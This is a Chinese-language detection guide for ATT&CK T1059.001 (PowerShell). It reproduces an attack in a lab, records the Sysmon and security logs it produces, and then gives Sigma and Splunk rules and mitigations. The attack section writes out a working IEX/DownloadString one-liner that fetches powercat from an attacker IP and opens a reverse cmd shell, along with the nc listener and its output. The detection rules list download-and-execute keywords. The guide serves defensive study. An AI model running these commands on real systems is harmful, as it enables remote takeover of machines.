# T1059-Win-使用Powershell.exe执行Payload（白名单）

## 描述

攻击者可能滥用PowerShell（`powershell.exe`）执行命令和脚本，以实现信息发现、恶意代码执行、持久性或横向移动（T1059.001）。PowerShell是Windows操作系统内置的强大命令行和脚本环境，支持本地和远程操作。攻击者可通过PowerShell下载并执行远程Payload（如脚本或可执行文件），在内存中运行以规避磁盘检测，或直接调用系统API执行高级操作。由于`powershell.exe`是合法的白名单进程，其行为可能被误认为是正常操作，增加检测难度。

常见的攻击场景包括通过PowerShell从远程服务器下载恶意脚本（如`powercat.ps1`），并建立反弹Shell或执行其他恶意操作。PowerShell的高灵活性使其成为攻击者青睐的工具，尤其在结合`Invoke-Expression`（IEX）、`Net.WebClient`等功能时，可轻松实现文件下载和动态执行。

## 测试案例

1. **反弹Shell建立**  
   攻击者使用PowerShell下载并执行`powercat.ps1`，建立与攻击机的反弹Shell。

2. **内存中Payload执行**  
   攻击者通过PowerShell从远程服务器下载恶意脚本，在内存中执行以规避磁盘检测。

## 检测日志

**Windows PowerShell日志**  
- **Microsoft-Windows-PowerShell/Operational**：记录PowerShell命令执行和脚本块信息。  
  - 事件ID 4103：记录模块日志和命令执行。  
  - 事件ID 4104：记录脚本块执行，包含下载和执行命令的详细信息。

**Windows安全日志**  
- **事件ID 4688**：记录进程创建，包含`powershell.exe`的命令行参数。

**Sysmon日志**  
- **事件ID 1**：记录进程创建，包含`powershell.exe`的完整命令行和父进程信息。  
- **事件ID 3**：记录网络连接，可能涉及PowerShell发起的HTTP请求或反弹Shell。  
- **事件ID 11**：记录文件创建，可能涉及下载的文件写入磁盘。

**配置日志记录**  
- 启用PowerShell日志：  
  - 打开`gpedit.msc`：`计算机配置 > 管理模板 > Windows组件 > Windows PowerShell`。  
  - 启用“启用模块日志记录”、“启用脚本块日志记录”和“启用脚本执行日志记录”。  
- 启用命令行参数记录：`本地计算机策略 > 计算机配置 > 管理模板 > 系统 > 审核进程创建 > 在进程创建事件中加入命令行 > 启用`。  
- 部署Sysmon以增强进程和网络活动监控。

## 测试复现

### 环境准备
- **攻击机**：Kali Linux 2019或其他攻击平台，安装`powercat`和`nc`。  
- **靶机**：Windows 7，安装Sysmon并启用PowerShell日志。  
- **网络**：确保攻击机和靶机可通信（HTTP端口80，Shell端口1234）。  
- **工具**：`powercat`（<https://github.com/besimorhino/powercat>）。

### 攻击步骤
1. **生成Payload**  
   在攻击机上下载`powercat`：
   ```bash
   git clone https://github.com/besimorhino/powercat.git
   ```

2. **开启HTTP服务**  
   在`powercat`目录下启动简单HTTP服务器：
   ```bash
   python2 -m SimpleHTTPServer 80
   ```

3. **设置监听**  
   在攻击机上启动`nc`监听反弹Shell：
   ```bash
   nc -lvp 1234
   ```

4. **靶机执行Payload**  
   在靶机上运行以下PowerShell命令，下载并执行`powercat.ps1`：
   ```cmd
   powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd"
   ```

5. **验证反弹Shell**  
   检查攻击机的`nc`终端，确认收到反弹Shell：
   ```bash
   nc -lvp 1234
   listening on [any] 1234 ...
   192.168.126.149: inverse host lookup failed: Unknown host
   connect to [192.168.126.146] from (UNKNOWN) [192.168.126.149] 49339
   Microsoft Windows [Version 6.1.7601]
   Copyright (c) 2009 Microsoft Corporation. All rights reserved.
   ```

## 测试留痕

```log
#sysmon日志
EventID: 1
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell  -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.126.146/powercat.ps1');powercat -c 192.168.126.146 -p 1234 -e cmd"

# win7安全日志
EventID: 4688
进程信息:
新进程 ID: 0x330
新进程名: C:\Windows\System32\cmd.exe
令牌提升类型: TokenElevationTypeLimited (3)

EventID: 4688
进程信息:
新进程 ID: 0xa44
新进程名: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

#Powershell V5(含V5以上)配置审核策略，可以达到记录命令行参数的效果。通过命令行参数进行监控分析。当然也可以采用配置windows server 2008(不含2008)以上审核进程创建策略，同样也可以对命令行参数进行记录，最后达到监控效果。
```

## 检测规则/思路

**检测规则**  
通过分析PowerShell日志、Sysmon和Windows安全日志，检测PowerShell执行远程Payload的异常行为。以下是具体思路：

1. **日志分析**：
   - 收集PowerShell日志（事件ID 4104），提取包含下载函数（如`Net.WebClient`、`DownloadString`）或反弹Shell命令的脚本块。  
   - 收集Sysmon事件ID 1或Windows安全事件ID 4688，检测`powershell.exe`的命令行中包含下载或执行相关关键字。  
   - 监控Sysmon事件ID 3，检测PowerShell发起的HTTP请求或异常网络连接。

2. **Sigma规则（进程创建）**：
   ```yaml
   title: PowerShell通过URL下载并执行Payload
   id: 8e9f0a1b-9c4d-4e3f-c1b0-6a7b8e9f0a1c
   status: stable
   description: 检测PowerShell通过URL下载并执行Payload的进程，可能表明恶意行为
   author: 12306Bro, Grok
   date: 2025/06/06
   references:
     - https://attack.mitre.org/techniques/T1059/001/
   tags:
     - attack.execution
     - attack.t1059.001
   logsource:
     category: process_creation
     product: windows
   detection:
     selection:
       Image|endswith: '\powershell.exe'
       CommandLine|contains:
         - 'new-object system.net.webclient).downloadstring('
         - 'new-object system.net.webclient).downloadfile('
         - 'new-object net.webclient).downloadstring('
         - 'new-object net.webclient).downloadfile('
         - 'IEX'
         - 'http'
     condition: selection
   fields:
     - CommandLine
     - ParentCommandLine
   falsepositives:
     - 合法的软件更新或脚本下载
     - 管理员运行的维护脚本
   level: medium
   ```

3. **Sigma规则（PowerShell日志）**：
   ```yaml
   title: PowerShell脚本块下载并执行Payload
   id: 9f0a1b2c-0d5e-4f4a-d2c1-7b8c9f0a1b2d
   status: stable
   description: 检测PowerShell脚本块中包含下载并执行Payload的命令
   author: Grok
   date: 2025/06/06
   logsource:
     product: windows
     service: powershell
   detection:
     selection:
       EventID: 4104
       ScriptBlockText|contains:
         - 'Net.WebClient'
         - 'DownloadString'
         - 'DownloadFile'
         - 'IEX'
         - 'http'
     condition: selection
   falsepositives:
     - 合法的脚本下载（如软件更新）
     - 开发或测试环境的正常行为
   level: medium
   ```

4. **SIEM规则**：
   - 检测PowerShell下载和执行Payload的进程创建和网络活动。
   - 示例Splunk查询（Sysmon）：
     ```spl
     source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 Image="*\powershell.exe" (CommandLine="*Net.WebClient*" OR CommandLine="*DownloadString*" OR CommandLine="*DownloadFile*" OR CommandLine="*IEX*" OR CommandLine="*http*") | stats count by Image, CommandLine, ComputerName, User
     ```
   - 示例Splunk查询（PowerShell日志）：
     ```spl
     source="Microsoft-Windows-PowerShell/Operational" EventCode=4104 (ScriptBlockText="*Net.WebClient*" OR ScriptBlockText="*DownloadString*" OR ScriptBlockText="*DownloadFile*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*http*") | stats count by ScriptBlockText, ComputerName, User
     ```

5. **网络流量分析**：
   - 监控PowerShell发起的HTTP/HTTPS请求或异常出站连接（如反弹Shell）。  
   - 示例Wireshark过滤器：
     ```plaintext
     tcp.port == 1234 or (http.request and ip.src == <target_ip> and http.request.uri contains ".ps1")
     ```

6. **威胁情报整合**：
   - 检查PowerShell访问的URL、IP或下载文件的哈希值是否与已知恶意活动相关，结合威胁情报平台（如VirusTotal、AlienVault）。

## 建议

### 缓解措施

防御PowerShell执行Payload的恶意行为需从系统加固、权限控制和监控入手：

1. **限制PowerShell执行**  
   - 配置PowerShell执行策略，限制未签名脚本运行：  
     ```powershell
     Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy RemoteSigned
     ```

2. **禁用不必要的PowerShell功能**  
   - 禁用PowerShell 2.0（若存在）：  
     ```cmd
     dism /online /disable-feature /featurename:MicrosoftWindowsPowerShellV2
     ```

3. **启用AMSI和日志记录**  
   - 确保反恶意软件扫描接口（AMSI）启用，检测恶意脚本执行。  
   - 启用PowerShell模块日志记录、脚本块日志记录和脚本执行日志记录。

4. **网络访问控制**  
   - 配置防火墙，限制PowerShell的出站HTTP/HTTPS连接，仅允许白名单域名。  
   - 使用代理服务器监控和过滤PowerShell的网络流量。

5. **凭据保护**  
   - 启用多因素认证（MFA）保护管理员账户。  
   - 实施强密码策略，避免凭据泄露。

6. **日志和监控**  
   - 启用PowerShell日志（事件ID 4103/4104）、Sysmon日志（事件ID 1/3/11）和命令行参数记录（事件ID 4688）。  
   - 配置SIEM检测PowerShell下载和执行Payload的命令及网络活动。

## 参考推荐

- MITRE ATT&CK: T1059.001  
  <https://attack.mitre.org/techniques/T1059/001/>  
- PowerShell事件日志配置  
  <https://github.com/12306Bro/Hunting-guide/blob/master/Powershell-id.md>  
- Powercat工具  
  <https://github.com/besimorhino/powercat>